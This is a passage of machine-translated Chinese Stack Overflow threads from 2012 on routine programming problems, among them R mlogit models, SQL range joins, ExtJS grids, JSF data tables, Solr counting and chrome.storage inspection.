您可以为该不同的项目创建一个[DataTemplate （仅更改其背景）。](http://msdn.microsoft.com/en-us/library/system.windows.datatemplate.aspx)然后，使用[TemplateSelector](http://msdn.microsoft.com/en-us/library/system.windows.controls.datatemplateselector.aspx)，您可以确定您只想将该模板应用于其编号与绑定到 TextBox 的编号匹配的项目。

```
public class GridViewDataTemplateSelector : DataTemplateSelector
{
    public override DataTemplate
        SelectTemplate(object item, DependencyObject container)
    {
        FrameworkElement element = container as FrameworkElement;

        if (element != null && item != null && item is GridViewRow)
        {
            GridViewRow  rowitem = item as GridViewRow;

            // Here's where you compare with actual selected number (change 1 with the method call to obtain it.
            if (GridViewRow.RowIndex == 1) 
                return
                    element.FindResource("SpecialBackgroundRowTemplate") as DataTemplate;
            else 
                return
                    element.FindResource("NormalBackgroundRowTemplate") as DataTemplate;
        }

        return null;
    }
} 
```

这里`SpecialBackgroundRowTemplate`和`NormalBackgroundRowTemplate`是 DataTemplates，您将在其中为给定的网格行设置正常背景和聚焦背景。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:16:10.697

您可以定义`DataGridViewCellStyle`对象并设置它的属性，然后从您的 datagridview 调用任何单元格 -

```
DataGridViewCellStyle dgvs = new DataGridViewCellStyle();   
dgvs.BackColor = Color.Red;
yourDGV.Rows[0].Cells[0].Style = dgvs; 
```

# r - 使用 mlogit 包设置多项 logit 模型

> ID：12587784
> 
> 赞同：3
> 
> 时间：2012-09-25T17:05:16.823
> 
> 标签：r

我们正在尝试使用 mlogit 包估计出行方式选择模型。最终，我们打算建立一个包含更多变量的嵌套模型，但是我们试图首先建立一个非常简单的非嵌套多项模型来进行测试。特别是，我们试图完成的工作与 mlogit 包中的示例不同，因为我们有一些特定于替代方案（例如自行车、步行和开车）的实用功能。

我们的起始数据集（简化）具有以下形式：

```
"recid","mode","walk_mode_time","bike_mode_time","carsdivworkers"
254,"Bike",15.0666484832764,4.51999473571777,0.5
7,"SOV",17.9941387176514,5.39824199676514,2
40,"Walk",43,12.8999996185303,1 
```

我们要为此测试模型指定的效用函数如下：

效用（SOV）= beta1* cardivworkers

效用（步行）= 常数（步行）+ beta6*（walk_mode_time）+ beta7 *（carsdivworkers）

效用（自行车）= 常数（自行车）+ beta8*（bike_mode_time）+ beta9 *（carsdivworkers））

为了使我们的数据看起来更像 mlogit 文档中的示例，我们认为我们需要使用以下结构构建数据：

1.  复制的每条记录（其中列出了一个选择的备选方案）还包括给定行程的未选择的备选方案。
2.  未选择的替代品的替代品特定值归零

这导致数据结构如下所示：

```
"recid","mode","choice","walk_mode_time",”bike_mode_time","cardivwkr"
7,"Bike",FALSE,0,5.39824199676514,1
7,"DriveTransit",FALSE,0,0,1
7,"HOV2",FALSE,0,0,1
7,"HOV3",FALSE,0,0,1
7,"SOV",TRUE,0,0,1
7,"Walk",FALSE,17.9941387176514,0,1
7,"WalkTransit",FALSE,0,0,1
40,"Bike",FALSE,0,12.8999996185303,0.5
40,"DriveTransit",FALSE,0,0,0.5
40,"HOV2",FALSE,0,0,0.5
40,"HOV3",FALSE,0,0,0.5
40,"SOV",FALSE,0,0,0.5
40,"Walk",TRUE,43,0,0.5
40,"WalkTransit",FALSE,0,0,0.5
254,"Bike",TRUE,0,4.51999473571777,1
254,"DriveTransit",FALSE,0,0,1
254,"HOV2",FALSE,0,0,1
254,"HOV3",FALSE,0,0,1
254,"SOV",FALSE,0,0,1
254,"Walk",FALSE,15.0666484832764,0,1
254,"WalkTransit",FALSE,0,0,1 
```

然后我们将其转换为 mlogit 数据结构，如下所示：

```
logit_data <- mlogit.data(data=joined_data,
                          choice="choice",
                          shape="long",
                          alt.var="mode",
                          chid.var="recid",
                          drop.index=TRUE,
                          reflevel= "SOV") 
```

我们的型号规格：

```
mc <-mlogit(formula= choice ~  1 | carsdivworkers | walk_mode_time + bike_mode_time,  
          data = logit_data, reflevel= "SOV") 
```

不幸的是，当我们对我们的完整数据集运行它时，我们得到了以下错误：

solve.default(H, g[!fixed]) 中的错误：Lapack 例程 dgesv：系统完全是奇异的

我们认为这个公式指定了我们想要的效用函数，但不确定。这个对吗？此外，我们是否需要像我们所做的那样手动复制我们的数据记录？或者有没有办法让 mlogit.data() 从我们的初始数据集中构建一组选择？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T12:23:49.897

考虑到您准备的方式`walk_mode_time`，`bike_mode_time`您可能应该尝试`walk_mode_time + bike_mode_time | 1 + carsdivworkers | 0`作为公式。我通常发现产生部分归零的变量并仅使用公式的第一部分很方便，即`walk_mode_time + bike_mode_time + walk_mode_carsdivworkers + bike_mode_carsdivworkers + ... | 1 | 0`给`*_carsdivworkers`定的选项比替代的数量少一个（因此未指定的系数为零，其他相对于此）。

您的数据也可能有问题，例如选择零个或多个备选方案的选择情况，所有备选方案具有相同值的变量等。如果公式`0 | 1 | 0`失败，您可能有数据问题，如果作品你有一个公式问题。

# c++ - 即使已经包含了类的标头，也强制使用前向声明

> ID：12587786
> 
> 赞同：1
> 
> 时间：2012-09-25T17:05:21.050
> 
> 标签：c++, class

我在 C++ 代码中有一个奇怪的问题，我无法弄清楚发生了什么。我知道前向声明是什么，我知道什么时候使用它们等等......

但是，在我拥有的 C++ 项目中，我被迫声明一个已经在包含的标头中声明的类。它看起来像这样

windows.h：

```
#ifndef WINDOWS_HH_
#define WINDOWS_HH_

#include "foo.h"

class fooC;                 // If I don't forward declare here, won't compile!?
class WindowC
{
     public:
          WindowC();
          ~WindowC();
     public:
          fooC a;
};
#endif 
```

然后， foo.h 包含 fooC 的声明

```
#ifndef FOO_HH_
#define FOO_HH_
class fooC
{
     public:
            fooC();
            ~fooC();
};
#endif 
```

知道为什么会发生这种情况吗？实际代码是一个大项目的一部分，真的很难弄清楚错误可能是什么......但我相信理论上 fooC 的前向声明不应该是必要的，不是吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:39:38.697

这种影响的一个常见原因是头文件之间的循环依赖。

是否`foo.h`包含`windows.h`（可能是间接的）创建循环依赖？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:18:32.013

您需要反正的完整定义`fooC`，因为它直接（不是通过指针或引用）包含在`WindowC`. 就像@joval 说的那样，它不应该是必要的。你得到什么样的编译器错误？我会寻找简单的错误，例如在类定义后忘记包含警卫或分号。

# sql-server - T-SQL - 连接两个没有主键的表

> ID：12587790
> 
> 赞同：2
> 
> 时间：2012-09-25T17:05:38.303
> 
> 标签：sql-server, tsql, join

我有 2 个表格，代表 2 个不同的模型模拟。作为背景信息，这 2 个模型试图模拟相同的事物，但 modelA 试图表示非常具体的属性，而 modelb 试图模拟更广泛的范围。表 A 有 n 行，大于表 B 中的 m 行。我正在尝试创建一个与表 A 具有相同行数 (n) 的表，在该表中我可以看到哪些 modelA_ID 与 modelB_ID 相关。

表A：

```
ModelA_ID  region height weight
1          1       25      7.1            
2          1       70      7.1            
3          1       10      7.2            
4          1       30      7.3
5          1       35      7.4
6          2       30      7.1 
```

表B：

```
ModelB_ID  region min_height max_height min_weight max_weight
9001       1        0             50      7.1        7.3    
9002       1        51            100     7.1        7.3
9003       1        0             100     7.4        7.5
9004       2        0             100     7.1        7.5 
```

所以在上面的例子中，我应该以类似的方式结束

```
ModelA_ID  ModelB_ID    
1        9001            
2        9002            
3        9001            
4        9001      
5        9003     
6        9004 
```

区域在任一表中都不是唯一的。如果是我想我会加入，类似于

```
SELECT  TableA.ModelA_ID TableB.ModelB_ID 
FROM TableA
inner JOIN TableA
ON TableA.region =TableB.region
where 
TableA.height >= TableB.min_height
and TableA.height <= TableB.max_height
and TableA.weight >= TableB.min_weight
and TableA.weight <= TableB.max_weight 
```

但是 region 不是唯一的键，所以我不能这样做！

几天前刚接触 SQL，但来自 cshell 背景，但新工作只有 sql 政策:-(

有任何想法吗？这不是必须经常重复的事情，因此效率不是关键。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:10:08.727

> 但是 region 不是唯一的键，所以我不能这样做！

JOIN 列不一定是它们各自表中的主键。

```
SELECT 
    TableA.ModelA_ID,
    TableB.ModelB_ID 
FROM 
    TableA
    JOIN TableB
    ON TableA.region = TableB.region
WHERE 
    TableA.height >= TableB.min_height
AND TableA.height <= TableB.max_height
AND TableA.weight >= TableB.min_weight
AND TableA.weight <= TableB.max_weight 
```

上述查询的结果是：

```
ModelA_ID   ModelB_ID
----------- -----------
1           9001
3           9001
4           9001
2           9002
5           9003
6           9004

(6 row(s) affected) 
```

# sql - Extjs Gridview 不显示数据

> ID：12587799
> 
> 赞同：0
> 
> 时间：2012-09-25T17:06:27.597
> 
> 标签：sql, asp.net-mvc, json, gridview, extjs

我正在尝试使用 json 在 extjs 中创建一个网格视图。出于某种原因，我的 gridview 没有显示任何数据。我试图用萤火虫调试它。我可以在“响应”部分看到结果。这就是我在“响应”中的内容。

> {"ContentEncoding":null,"ContentType":null,"Data":"{\r\n \"myTable\": [\r\n {\r\n \"Q1\": \"1\" ,\r\n \"Q2\": \"1\",\r\n \"Q3\": \"1\",\r\n \"Q4\": \"1\",\ r\n \"改进\": \"\",\r\n \"评论\": \"1\"\r\n },\r\n {\r\n \"Q1\": \"1\",\r\n \"Q2\": \"2\",\r\n \"Q3\": \"3\",\r\n \"Q4\": \" 4\",\r\n \"改进\": \"Iphone5\",\r\n \"评论\": \"Iphone14\"\r\n },\r\n {\r\n \"Q1\": \"1\",\r\n \"Q2\": \"1\",\r\n \"Q3\": \"3\",\r\n \"Q4\": \"3\",\r\n \"改进\": \"这是评论1-3\",\r\n \"评论\": \"这是 Comment2-3\"\r\n }\r\n ]\r\n}","JsonRequestBehavior":0}

***更新*** 实际上我现在在 Json 中看到了这个，但是我的 gridview 仍然是空的 [请点击这里查看我的 JSON](http://i46.tinypic.com/dfje6t.jpg)

/GridViewApp.js

```
Ext.define('GridViewApp.view.GridViewApp', {
alias: 'widget.gridviewapp',
width: 800,
title: 'My Grid Panel',
grid: null,
store: null,
layout: {
    type: 'anchor'
},
constructor: function () {

    this.callParent(arguments);

    var store = Ext.create('Ext.data.Store', {

        storeId: 'myData',
        scope: this,
        fields: [
        { name: 'Q1', type: 'int' },
        { name: 'Q2', type: 'int' },
        { name: 'Q3', type: 'int' },
        { name: 'Q4', type: 'int' },
        { name: 'Q5', type: 'int' },
        { name: 'Improvements', type: 'string' },
        { name: 'Comments', type: 'string' }
        ],

        sorters: [
            {
                //property: 'myData',
                direct: 'ASC'
            }
         ],

        proxy: {
            type: 'ajax',
            scope: this,
            url: 'GridView/writeRecord',
            reader: {
                type: 'json',
                root: 'myTable',
                idProperty: 'ID'

                }
        } 
    });

    store.load();   
    this.grid = Ext.create('Ext.grid.Panel', {
        title: 'GridView App',
        store: this.store,
        columns: [
            {header: 'Q1', width: 100,
        sortable: true, dataIndex: 'Q1'
                    },
        { header: 'Q2', width: 100,
            sortable: true, dataIndex: 'Q2'
        },
        { header: 'Q3', width: 100,
            sortable: true, dataIndex: 'Q3'
        },
                    { header: 'Q4', width: 100,
                        sortable: true, dataIndex: 'Q4'
                    },
                    { header: 'Improvements', width: 200,
                        sortable: true, dataIndex: 'Improvements'
                    },
                    { header: 'Comments', width: 200,
                        sortable: true, dataIndex: 'Comments'
                    }
    ],
        stripeRows: true,
        width: 800,
        renderTo: Ext.getBody()
    });
    this.add(this.grid);
}
}); 
```

和 /GridViewController.cs

```
namespace GridViewApp.Controllers
{
public class GridViewController : Controller
{

    public ActionResult Index()
    {
        return View();
    }

    public JsonResult writeRecord()
    {

        SqlConnection conn = DBTools.GetDBConnection("ApplicationServices2");

        string sqlquery = "SELECT Q1, Q2, Q3, Q4, Improvements, Comments FROM myTable";
        SqlDataAdapter cmd = new SqlDataAdapter(sqlquery, conn);

        DataSet myData = new DataSet();
        cmd.Fill(myData, "myTable");

        conn.Open();

        conn.Close();

        string myData1 = JsonConvert.SerializeObject(myData, Formatting.Indented,
                        new JsonSerializerSettings
                        {
                            ReferenceLoopHandling = ReferenceLoopHandling.Ignore
                        });

        return Json(new { data = myData1 }, JsonRequestBehavior.AllowGet);
    } 

}
} 
```

任何形式的输入都会有很大帮助...谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T06:54:32.583

它返回一个字符串是非常合乎逻辑的。

你用 json.net 序列化成一个字符串。然后你用 Json() 序列化那个字符串。您应该只使用 json.net 序列化。

```
public string writeRecord()
{

    SqlConnection conn = DBTools.GetDBConnection("ApplicationServices2");

    string sqlquery = "SELECT Q1, Q2, Q3, Q4, Improvements, Comments FROM myTable";
    SqlDataAdapter cmd = new SqlDataAdapter(sqlquery, conn);

    DataSet myData = new DataSet();
    cmd.Fill(myData, "myTable");

    conn.Open();

    conn.Close();

    return myData1 = JsonConvert.SerializeObject(myData, Formatting.Indented,
                    new JsonSerializerSettings
                    {
                        ReferenceLoopHandling = ReferenceLoopHandling.Ignore
                    });

} 
```

# sql-server - 通过 linq 访问 SQL 数据类型属性

> ID：12587803
> 
> 赞同：0
> 
> 时间：2012-09-25T17:06:39.957
> 
> 标签：sql-server, linq-to-sql, data-binding

在我的 sql 数据库中，我有一个要绑定到文本框的 numeric(3,2) 字段。当 Linq to SQL 引入字段时，它会将字段转换为其 linq 对象上的小数。是否可以访问数字精度和比例，以便在自定义控件的情况下在验证或绑定中使用它们？最终我想阻止用户在 UI 端输入超过两个小数点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T17:18:11.377

我发现你可以做这样的事情

```
 string val = String.Empty;

        Type t = obj.GetType();
        PropertyInfo prop = t.GetProperty(fieldName);
        object[] info = prop.GetCustomAttributes(typeof(ColumnAttribute), true);

        if (info.Length == 1)
        {
            ColumnAttribute ca = (ColumnAttribute)info[0];
            string attr = ca.DbType
                            //... parse attr to get the info you want
        }

        return val; 
```

这并不理想，因为您必须解析出一个字符串才能得到我正在寻找的东西。但它有效。

# xib - 我应该有两个 XIB 来处理 iOS5 和 iOS6 吗？

> ID：12587804
> 
> 赞同：1
> 
> 时间：2012-09-25T17:06:48.470
> 
> 标签：xib, ios6

刚刚升级到最新的Xcode，和iOS6。当您使用 XIB 创建一个新的视图控制器时，它默认为 iOS6 屏幕大小，但您可以手动更改此设置以查看您的应用程序在 iOS5 中的外观。

我的问题是，您是否打算拥有两个 XIB，一个专门为 iOS5 设计，另一个在 iOS6 中设计；还是您使用某种自动调整大小的工具来处理所有事情？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:13:16.693

在 Apple Dev Boards 中已经有很多关于这个的讨论。我对此的看法：

如果您可以使用自动调整大小或自动布局，**请不要使用多个 XIB**。

我敢打赌，每个人都会使用 99% 的视图，这是完全可以管理的。表视图很简单，如果您的表视图需要一个 XIB，只使用一个。如果您对 3.5" 和 4" 的看法明显不同，请使用两个 XIB。但是尝试通过实施一个聪明的`layoutSubviews`例程来避免这种情况。

* * *

父视图的简单示例始终`bottomView`在底部和全宽对齐子视图：

```
- (void)layoutSubviews
{
    CGSize mySize = self.bounds.size;

    CGRect bottomFrame = bottomView.frame;
    bottomFrame.origin.y = mySize.height - bottomFrame.size.height;
    bottomFrame.size.width = mySize.width;
    bottomView.frame = bottomFrame;
} 
```

# ruby-on-rails - PGError：错误：当前事务被中止

> ID：12587807
> 
> 赞同：26
> 
> 时间：2012-09-25T17:07:03.487
> 
> 标签：ruby-on-rails, postgresql

使用：Rails 3.0.3 和 Heroku 与 Postgresql。

我收到了许多例外，例如：

```
A ActiveRecord::StatementInvalid occurred in home#index:

  PGError: ERROR:  current transaction is aborted, commands ignored until end of transaction block
: SELECT "calculation_types".* FROM "calculation_types"
  .bundle/gems/ruby/1.9.1/gems/activerecord-3.0.3/lib/active_record/connection_adapters/abstract_adapter.rb:202:in `rescue in log' 
```

发生在我的应用程序中，但总是在我执行这种情况时发生

```
calculation_type = CalculationType.find(params[:id]) 
```

或类似的，超级简单的数据库请求。

我的宝石列表（从我上传到 Heroku 时开始）：

```
 Installing rake (0.9.2.2) 
   Installing abstract (1.0.0) 
   Installing activesupport (3.0.3) 
   Installing builder (2.1.2) 
   Installing i18n (0.6.1) 
   Installing activemodel (3.0.3) 
   Installing erubis (2.6.6) 
   Installing rack (1.2.5) 
   Installing rack-mount (0.6.14) 
   Installing rack-test (0.5.7) 
   Installing tzinfo (0.3.33) 
   Installing actionpack (3.0.3) 
   Installing mime-types (1.19) 
   Installing polyglot (0.3.3) 
   Installing treetop (1.4.10) 
   Installing mail (2.2.19) 
   Installing actionmailer (3.0.3) 
   Installing arel (2.0.10) 
   Installing activerecord (3.0.3) 
   Installing activeresource (3.0.3) 
   Installing acts_as_tree_rails3 (0.1.0) 
   Installing breadcrumbs_on_rails (2.2.0) 
   Installing yamler (0.1.0) 
   Installing configatron (2.9.1) 
   Installing daemons (1.1.9) 
   Installing eventmachine (1.0.0) with native extensions 
   Installing exception_notification (2.4.1) 
   Installing friendly_id (4.0.0.beta12) 
   Installing i18n_routing (0.6.1) 
   Installing thor (0.14.6) 
   Installing railties (3.0.3) 
   Installing jquery-rails (1.0.19) 
   Installing pg (0.14.1) with native extensions 
   Installing postgres-pr (0.6.3) 
   Installing rack-rewrite (1.0.2) 
   Installing rack-timeout (0.0.3) 
   Using bundler (1.0.7) 
   Installing rails (3.0.3) 
   Installing thin (1.5.0) with native extensions 
   Installing time_diff (0.2.2) 
```

**事实**

*   这些错误是间歇性的，我无法重现它们。
*   大多数情况下，搜索引擎机器人尝试访问该页面时似乎都会发生这种情况

**问题**

Q1。我什至不知道从哪里开始解决这个问题（你还需要我的代码的哪些其他部分？）。我的第一步应该是什么？

Q2。Rails 3.0.3 和 Postgresql 是否存在任何已知问题？

*   你还需要什么来帮助我解决问题？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2015-03-03T21:27:59.790

我刚刚重新启动了我的服务器。这取消了交易。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2013-04-07T15:10:06.390

这个错误永远不是你真正的问题。发生这种情况是因为您在由于上游错误而已经失败的事务中发送了一条语句。如果你看到很多这样的错误，你想回到你的日志中找到流中的第一个错误，这将是一个不同的错误。

找到这个，然后修复它。请注意，这仅意味着您在出现其他错误后继续交易。其他错误是问题所在。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-14T17:02:53.717

您可以执行`CalculationType.all`或`CalculationType.first`不执行错误吗？

如果您可以从该模型访问一些数据，那么重新索引您的表可以解决问题，试试这个：

```
REINDEX TABLE <table_name> 
```

或在 Rails 控制台中：

```
ActiveRecord::Base.connection.execute("reindex table <table_name>") 
```

前段时间也遇到过类似的问题，希望对你有帮助。

# android - 如何在Android上纵向录制视频

> ID：12587815
> 
> 赞同：0
> 
> 时间：2012-09-25T17:08:07.037
> 
> 标签：android, android-camera, android-video-player

我有一个应用程序，用户可以在其中录制视频。该应用程序旨在纵向使用。相机预览很好，但是当我观看视频时，它被旋转到一边。我知道您无法修改相机流，您可以这样做的方法是旋转视频，之后将是一项繁重的任务。我在问你知道标准的android相机是如何解决这个问题的，在普通相机上你可以录制人像，录制的视频是人像。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:36:23.070

我不太清楚你的意思，但你可以尝试在“相机预览”上强制相反的方向，看看它是如何工作的。它可能会根据您的喜好记录它，然后您就有了解决方案。

# performance - 移动 AIR 环境中运行时图像缩放的成本有多高？

> ID：12587818
> 
> 赞同：1
> 
> 时间：2012-09-25T17:08:13.533
> 
> 标签：performance, mobile, air, runtime, image-scaling

我的猜测是，这实际上是相对昂贵的。我还没有对其进行分析，但我正在寻找一些见解。如果我在运行时将一个大位图 (433x396) 缩放到大小的 1/5，那么它对性能有多大影响？特别是在重复 4 或 5 次的情况下。我不知道它是否真的像 Java 那样依赖于底层系统。我正在尝试针对不同的像素密度，我的目标是通过 ant 脚本根据设备配置捆绑一组不同的资产，以减小应用程序包的大小。我不是直接寻找任何解决方法，我只是想深入了解运行时扩展的性能成本，以便做出明智的决定。提前感谢大家。

# visual-c++ - 如何将编辑控件的文本设置为浮点值？

> ID：12587819
> 
> 赞同：0
> 
> 时间：2012-09-25T17:08:18.553
> 
> 标签：visual-c++

我正在尝试将 an 的字符串值设置 `Edit Control`为浮点数的值。所以我首先将浮点数转换为字符串，然后调用`SetDlgItemText`：

```
 fvalue = 0.123;
        wchar_t szBuff[100];
        wsprintf(szBuff, L"%f", fvalue );
        SetDlgItemText(m_hWnd, IDC_EDIT1, szBuff); 
```

不幸的是，这不起作用，我收到堆栈溢出错误。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:30:32.810

这就是我最终这样做的方式：

```
wchar_t buf[256];
LPCTSTR pszFormat = TEXT("%4.4f");
StringCbPrintf(buf, sizeof(buf), pszFormat, fvalue );
SetDlgItemText(m_hWnd, IDC_EDIT1, buf); 
```

# javascript - onchange 不适用于月份选择器

> ID：12587820
> 
> 赞同：0
> 
> 时间：2012-09-25T17:08:38.240
> 
> 标签：javascript, jquery, datepicker

这是我的 [代码](http://jsfiddle.net/2YpsB/17/)
与日期选择器不同，选择月份时，月份选择器不会打开网页。
我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:13:47.163

monthpicker 劫持了 onchange 事件并且不会冒泡它。您应该通过库本身进行 onChange。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T21:31:54.680

终于找到了解决方案......使用onClose。

**window.location.href=this.value;**
选择月份时，必须在 onClose 中打开网页。
[这](http://jsfiddle.net/2YpsB/40/)是完整的代码。

# java - jsf - 数据表中的 commandLink 用于删除行

> ID：12587828
> 
> 赞同：0
> 
> 时间：2012-09-25T17:09:31.127
> 
> 标签：java, ajax, jsf, datatable, commandlink

我想将 ah:commandLink 放入 ah:dataTable 以删除单行。在这里，我有一个不起作用的代码，希望您能帮助我。这段代码甚至没有调用我的删除方法。h:dataTable 的数据来自数据库。

**XHTML**

```
 <h:form>
            <div class="center">
                <h:dataTable id="list" value="#{firstBackingBean.list}"
                    var="first" styleClass="center">

                    <!-- other columns (take data from firstBackingBean) -->

                    <h:column>
                        <f:facet name="header" />
                        <h:commandLink value="delete" action="#{secondBackingBean.delete}" >
                            <f:ajax execute="@form" render="list" />
                            <f:param name="id" value="#{first.id}"/>
                        </h:commandLink>
                    </h:column>
                </h:dataTable>
            </div>
        </h:form> 
```

**第一个BackingBean**

```
import javax.faces.bean.ManagedBean;
import javax.faces.bean.ViewScoped;

@ManagedBean
@ViewScoped
public class FirstBackingBean {
    public void delete() {
        System.out.println("\nBUTTON CLICKED\n");
    }
} 
```

**第二个BackingBean**

```
import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;

@ManagedBean
@SessionScoped
public class SecondBackingBean {
    // ...
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:48:47.660

当`UICommand`组件内部的`UIData`组件不调用它的动作时，往往意味着组件`value`属性背后的模型在`UIData`表格显示请求和后续提交表单请求之间发生了不兼容的变化。

如果支持 bean 是请求范围的，并且模型是基于请求范围的变量（例如请求参数）预初始化的，则可能会发生这种情况，该变量在表单提交请求期间不再存在。

将 bean 放在视图范围内应该可以修复它。

### 也可以看看：

*   [未调用 commandButton/commandLink/ajax 操作/侦听器方法或未更新输入值](https://stackoverflow.com/questions/2118656/hcommandlink-hcommandbutton-is-not-being-invoked)
*   [如何将选定的行传递给 dataTable 中的 commandLink？](https://stackoverflow.com/questions/4994458/how-can-i-pass-a-parameter-to-a-commandlink-inside-a-datatable)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T11:20:56.400

我有答案！

我有 2 个 BackingBean，第一个BackingBean 需要**@SessionScoped**注释，第二个BackingBean 需要@ViewScoped 注释。

非常感谢其他答案。

# asp.net - 如何将在数据访问层中创建的数据集绑定到 UI 中的网格视图？

> ID：12587829
> 
> 赞同：0
> 
> 时间：2012-09-25T17:09:32.267
> 
> 标签：asp.net

下面是代码..

```
namespace ConfigurationSystem.DataAccess
{
    public class DataAccessLayer
    {
        public DataSet GetRoleCreationDetails(int? Roles_Id, string Code, string Name, string IsActive)
        {

            try
            {
                string con = @"Data Source=PAVANKUMAR-PC\PAVAN;Initial Catalog=ConfigurationSystem;Integrated Security=True";
                SqlConnection connection = new SqlConnection(con);
                SqlCommand command = new SqlCommand();
                command.Connection = connection;
                command.CommandType = CommandType.StoredProcedure;
                command.CommandText = "SP_GetRoleCreationDetails";
                command.Parameters.AddWithValue("@UserRole_Id", Roles_Id);
                command.Parameters.AddWithValue("@RoleId", Code);
                command.Parameters.AddWithValue("@UserId", Name);
                command.Parameters.AddWithValue("@IsActive", IsActive);

                SqlDataAdapter adapter = new SqlDataAdapter(command);
                DataSet dataset = new DataSet();
                adapter.Fill(dataset);
                //status = Convert.ToString(command.Parameters["@OuptputParam"].Value);
                return dataset;
            }
            catch (Exception exception)
            {
                throw new ArgumentException(exception.Message);
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:10:42.967

您将数据集传递给 UI 并执行以下操作：

```
myGrid.DataSource = GetReturnedDS();
myGrid.DataBind(); 
```

换句话说，在 UI 中：

```
Dataset ds = MyBLL.GetData();
myGrid.DataSource = ds;
myGrid.DataBind(); 
```

在 BLL 中：

```
public static DataSet GetData()
 {
  return  DLL.GetData();
 } 
```

在 DLL 中：

```
public static DataSet GetData()
 {
  //your code here
  return yourDataSet;
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:12:33.557

你需要创建你的`class DataAccessLayer`第一个对象。在表单顶部使用 using 或使用命名空间作为类名的前缀，如下所示。您需要为您的类和命名空间使用有意义的全名。

```
grid1.DataSource = new ConfigurationSystem.DataAccess.DataAccessLayer().GetRoleCreationDetails("1", "code", "name", "true");
grid1.DataBind(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T17:12:40.457

在您的 aspx.cs 中执行此操作

```
myGrid.DataSource = new DataAccessLayer().DataGetRoleCreationDetails(parameters here..)
myGrid.DataBind(); 
```

# solr - 在 Solr 中计数

> ID：12587832
> 
> 赞同：6
> 
> 时间：2012-09-25T17:09:44.307
> 
> 标签：solr

我在 Solr 中存储以下文档：

```
 doc {
    id: string; // this is a unique string that looks like an md5 result
    job_id: string; // this also looks like an md5 result -- this is not unique
    doc_id: number; // this is a long number -- this is not unique
    text: string; // this is stored, indexed text -- this is not unique
  } 
```

现在我要做的是计算其中包含文本 foo 的文档（doc_id）的数量。所以如果这是 SQL，我想发出这样的问题：

```
SELECT count(distinct doc_id)
FROM Doc
WHERE text like '%foo%'; 
```

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T10:21:56.660

要使其工作（使用[Result Grouping/Filed collapsing](http://wiki.apache.org/solr/FieldCollapsing)），您需要满足一些条件。

*   您必须使您的文本查询 ("%foo%") 在常规搜索中工作
*   doc_id 必须是字符串，您可以拥有该字段的副本并将其称为 doc_id_str

然后你可以提出这样的请求：

```
/select/?q=foo&rows=0&group=true&group.field=doc_id_str&group.limit=0&group.ngroups&group.format=simple&wt=json 
```

This query works for me. How would it work for you, depends on your index and size of it. Please ask if you need some more guidance.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T06:24:29.547

`count (distinct fieldName)`目前在 Solr 中无法进行类似的操作。Jira 中存在与此问题相关的问题（[SOLR-1814](https://issues.apache.org/jira/browse/SOLR-1814)和[SOLR-2242 ）。](https://issues.apache.org/jira/browse/SOLR-2242)也许阅读问题中的评论会对您有所帮助。

# java - Java Applet 安全性外部域

> ID：12587836
> 
> 赞同：0
> 
> 时间：2012-09-25T17:10:13.950
> 
> 标签：java, security, applet

我想在我的服务器之间使用我自己的 java ftp 上传器，但是我不知道是什么导致了连接问题。我查看了目标服务器中的 java.policy。我自己签署了 jar 文件。

我的小程序在 Eclipse 或同一域下运行良好，但是当我尝试从不同的 URL 连接时，它会卡在

```
ftp.connect(this.host,2121);

ftp.setRemoteVerificationEnabled(true);
ftp.enterLocalPassiveMode();
ftp.login(username, password); 
```

# javascript - 如何手动检查 chrome.storage 的值

> ID：12587842
> 
> 赞同：3
> 
> 时间：2012-09-25T17:11:07.927
> 
> 标签：javascript, google-chrome-extension, local-storage

我知道如何使用开发人员资源面板检查哪些 localStorage 值存储在 chrome 中，但是如何检查 chrome.storage 中存储的内容？我知道如何通过编程来做到这一点，但只是为了快速检查存储了哪些值，这有点麻烦。我已经进行了一些搜索，但这次谷歌不是我的朋友 :(

问候，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T17:57:34.320

好的，我找到了一种方法，但它不是很好。您可以使用 javascript 控制台。确保您处于要检查其存储数据的扩展的上下文中。输入这个命令：

```
chrome.storage.local.get(null, function (Items) {console.log(Items)}); 
```

（如果这是您要查找的内容，您可以将“本地”更改为“同步”。）这将输出该扩展名存储在 chrome.storage 中的所有数据。

正如我所说，这不是很好，如果有人有更好的建议，我将非常感激。

问候，

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:15:57.240

我仍然不确定您在问什么，或者您已经拥有的工具到底是什么问题。

有很多附加组件[https://chrome.google.com/webstore/search/localstorage](https://chrome.google.com/webstore/search/localstorage)

如果你想用代码来做，你可以遍历键。

```
for (var key in localStorage){
   console.log(key + ":\t" + localStorage[key]);
} 
```

或者

```
var localStorageKeys = Object.keys(localStorage); 
```

# c# - 实体框架发送错误的日期来更新声明

> ID：12587843
> 
> 赞同：1
> 
> 时间：2012-09-25T17:11:16.283
> 
> 标签：c#, asp.net, sql-server, asp.net-mvc-3, entity-framework

